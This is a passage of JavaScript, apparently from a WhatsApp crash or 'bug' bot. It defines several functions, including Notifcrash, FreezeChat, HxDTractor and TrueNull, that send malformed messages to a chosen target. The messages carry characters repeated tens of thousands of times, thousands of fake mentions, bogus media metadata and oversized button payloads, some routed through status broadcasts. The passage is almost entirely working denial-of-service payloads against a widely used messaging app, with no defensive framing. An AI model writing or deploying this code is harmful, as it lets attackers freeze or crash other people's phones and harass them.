꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟".repeat(12000)
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`,
              creatorName: "Verse"
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "10181722822@s.whatsapp.net"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, ElHxD.message, { messageId: ElHxD.key.id });
}
async function HxDClaws(target) {
  const msg = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "192917391927193819@newsletter",
          newsletterName:
            "HxD - Claws" +
            "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰".repeat(21000),
          caption:
            "HxD || Cancer" +
            "꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟ ꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰⃟꙰".repeat(21000),
          inviteExpiration: "999999999",
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp:
                  Math.floor(Date.now() / 1000) + 1814400
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  await sock.sendMessage(target, { delete: msg.key });
}

async function Notifcrash(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "KxH - King Narendra" + "ꦽ".repeat(20000),
        url: "https://t.me/" + "NarendraRajaIblis" + "ꦽ".repeat(20000),
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "ꦽ".repeat(20000),
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: "KxH - King Narendra" + "ꦽ".repeat(20000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.sendMessage(target, msg.message, {
    messageId: msg.key?.id,
    quoted: null
  });
}
async function kresjandaotax(target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(10000),
          "body": "ꦽ".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { "screen": "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
        },
        "header": { 
          "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(50000),
          "hasMediaAttachment": false,
          "videoMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
            "mimetype": "video/mp4",
            "fileSha256": "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
            "fileLength": "9999999999999999",
            "seconds": 9999,
            "mediaKey": "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
            "height": 9999,
            "width": 9999,
            "fileEncSha256": "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
            "directPath": "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1755691703",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
            "streamingSidecar": "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(50000)
            },
            "footer": {
              "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, carousel.message, {
      "messageId": carousel.key.id,
      participant: { jid: target }
    });
  }
}

//Freeze
async function FreezeChat(target) {

    const mentions = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
        ),
    ];

    const msg = {
        newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "Know Me Faridz?" + "ꦽ".repeat(5000),
            caption: "𖣂- Faridz Is Here !" + "ꦾ".repeat(5000) + "ꦽ".repeat(4500),
            inviteExpiration: 90000,
            contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: mentions
            }
        }
    };

    
    await sock.relayMessage(
        target,
        {
            key: {
                remoteJid: target,
                fromMe: false,
                id: sock.generateMessageTag() 
            },
            message: msg
        }
    );
}


async function frezeeClick(target) {
  const zieeMsg = {
    interactiveMessage: {
      header: {
        hasMediaAttachment: false,
        title: "Excellent, I Found Ziee :D"
      },
      body: { text: "\x10" },
      footer: { text: "\x10" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              id: null
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              url: "https://"+"𑜦𑜠".repeat(10000)+".com"
            })
          },
          {
            name: "cta_copy",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(10000),
              copy_code: "𑜦𑜠".repeat(10000)
            })
          }
        ],
        messageParamsJson: JSON.stringify({})
      }
    }
  };

  try {
    await sock.sendMessage(target, zieeMsg);
  } catch (err) {
  }
}
async function HxDPrince(target) {
  const msg = {
    stickerMessage: {
      mimetype: "image/webp",
      url: "https://wa.me/sticker/AllTheFeels",
      contextInfo: {
        externalAdReply: {
          title: "❤️‍🔥",
          body: null,
          mediaType: 1,
          showAdAttribution: true,
          mimetype: "image/webp",
          thumbnailUrl: "https://files.catbox.moe/v1qh0v.jpg",
          sourceUrl: "https://Verse.js/CrasPrimce.js.development",
          renderLargerThumbnail: true,
          containsAutoReply: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example"
        }
      }
    }
  }

    await sock.relayMessage(target, msg.message, { messageId: msg.key?.id });
}

async function HxDZiaoXang(target) {
  const ElHxD = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            videoMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4",
              mimetype: "video/mp4",
              caption: "Ziao Xang adalah seorang ci i o😙🗿🌪️😙☠️❤️‍🩹😭👈⚡😜⚡",
              fileSha256: Buffer.from(
                "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                "base64"
              ),
              fileEncSha256: Buffer.from(
                "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                "base64"
              ),
              mediaKey: Buffer.from(
                "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                "base64"
              ),
              directPath:
                "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
              fileLength: 12260,
              seconds: 1,
              mediaKeyTimestamp: Math.floor(Date.now() / 1000),
            },
          },
          body: {
            text: "HxD - ZiaoXang" + "\uB100".repeat(2000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "𑜦𑜠".repeat(100400),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "こんにちは",
                  id: "📌",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "MasDev",
                  url: "https://t.me/unkwon",
                  merchant_url: "https://t.me/Unkwon",
                }),
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: null,
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "\uB100",
                  id: "message",
                  copy_code: "\n".repeat(20000),
                }),
              },
              {
                name: "cta_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "WEBSITE!!!",
                  url: "https://" + "𑜦𑜠".repeat(5000) + ".my.id",
                }),
              },
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, ElHxD.message, { messageId: ElHxD.key?.id });
}


//Delay
async function HxDTractor(target) {
  const content = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh=11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe=69680D38&_nc_sid=5e03e0&mms3=true",
          directPath: "/v/t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh=11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe=69680D38&_nc_sid=5e03e0",
          mediaKey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI",
          fileSha256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
          fileEncSha256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY",
          mimetype: "image/webp",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1_700_000_000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 10000 }, () =>
                `1${Math.floor(Math.random() * 5_000_000)}@s.whatsapp.net`
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(-Math.random() * 20_000_000),
            high: 650,
            unsigned: false
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  };

  const msgVdua = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.99963118999,
          name: "\uBBBB".repeat(20040),
          url: "https://wa.me/stickerPack/." + "\uB100".repeat(20000),
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            externalAdReply: {
              quotedAd: {
                advertiserName: "\uB100".repeat(20000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9z/4OQHEOSBOWIWBEPSHEI39W/",
                caption: "\uB100".repeat(20000)
              },
              quotedMessage: {
                conversation: "\uF100".repeat(25000)
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    },
    type: "STATUS_MENTION_MESSAGE"
  };

  const msg = generateWAMessageFromContent(target, content, {});

  await sock.relayMessage(
    "status@broadcast",
    msgVdua.message,
    {
      messageId: msgVdua.key?.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    }
  );
}
async function TrueNull(target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
